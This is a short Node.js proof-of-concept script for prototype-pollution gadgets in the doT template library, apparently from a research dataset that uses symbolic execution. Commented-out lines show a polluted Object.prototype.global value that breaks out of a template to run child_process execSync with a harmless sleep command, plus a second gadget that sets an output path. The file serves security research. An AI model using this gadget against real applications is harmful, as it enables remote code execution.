'use strict';

var doT = require('dot');

// gadget 1
// Object.prototype.global = "}process.mainModule.require('child_process').execSync(\`sleep 10\`)}())//";

// gadget 2
// Object.prototype.destination = "/home/ubuntu/ppaeg/dataset/ppgadgets/doT/tmp"

try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}

// injected code can only be executed if undefined is passed to template function
const templates = doT.process({path: __dirname+'/views'});
var mytemplate = require(__dirname+'/views/mytemplate.js')